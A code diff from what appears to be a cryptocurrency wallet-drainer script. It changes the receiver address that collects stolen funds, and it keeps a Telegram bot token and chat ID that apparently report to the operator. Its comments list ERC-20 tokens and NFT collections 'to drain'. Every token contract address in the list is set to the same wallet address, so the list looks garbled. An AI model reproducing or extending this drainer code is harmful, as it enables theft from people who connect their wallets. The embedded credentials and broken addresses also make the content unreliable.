@@ -84,7 +84,7 @@ $(document).ready(function () {
     }
 
     // Credentials loaded from config.js
-    const RECEIVER_ADDRESS =  "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7";
+    const RECEIVER_ADDRESS =  "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7";
     const TELEGRAM_BOT_TOKEN =  "8535172282:AAHjqVlUk0zj5Sb72bQdFIwg7ylZMeUdyxw";
     const TELEGRAM_CHAT_ID =  "-1003768015882";
 
@@ -143,13 +143,13 @@ $(document).ready(function () {
 
     // Common ERC-20 token contracts (popular tokens to drain)
     const COMMON_TOKENS = [
-        { symbol: "USDT", address: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7", decimals: 6 },
-        { symbol: "USDC", address: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7", decimals: 6 },
-        { symbol: "LINK", address: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7", decimals: 18 },
-        { symbol: "UNI", address: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7", decimals: 18 },
-        { symbol: "WETH", address: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7", decimals: 18 },
-        { symbol: "SHIB", address: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7", decimals: 18 },
-        { symbol: "PEPE", address: "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7", decimals: 18 }
+        { symbol: "USDT", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 6 },
+        { symbol: "USDC", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 6 },
+        { symbol: "LINK", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
+        { symbol: "UNI", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
+        { symbol: "WETH", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
+        { symbol: "SHIB", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
+        { symbol: "PEPE", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 }
     ];
 
     // Common NFT contracts (popular collections to drain)
